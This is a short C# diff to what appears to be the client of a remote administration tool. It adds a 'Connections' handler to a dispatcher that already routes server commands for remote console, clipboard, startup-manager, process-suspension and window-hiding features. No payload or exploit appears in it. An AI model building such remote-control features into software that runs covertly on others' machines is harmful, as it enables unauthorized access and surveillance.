@@ -29,6 +29,7 @@ namespace MLManagementClient
             if (command == NetworkCommand.Console) ConsoleHandler.Handle(data);
             if (command == NetworkCommand.Clipboard) ClipboardHandler.Handle(data);
             if (command == NetworkCommand.StartupManager) StartupHandler.Handle(data);
+            if (command == NetworkCommand.Connections) ConnectionsHandler.Handle(data);
 
 
             if (command == NetworkCommand.Close) Environment.Exit(0);
@@ -43,7 +44,6 @@ namespace MLManagementClient
             if (command == NetworkCommand.SuspendProcess) MiscHandler.SuspendProcess((int)data[1]);
             if (command == NetworkCommand.ResumeProcess) MiscHandler.ResumeProcess((int)data[1]);
             if (command == NetworkCommand.HideWindow) MiscHandler.HideWindow((int)data[1]);
-            
         }
 
         public void OnDisconnect()
@@ -61,6 +61,7 @@ namespace MLManagementClient
             MiscHandler.SetClientHost(server);
             ClipboardHandler.SetHost(server);
             StartupHandler.SetHost(server);
+            ConnectionsHandler.SetHost(server);
         }
     }
 }
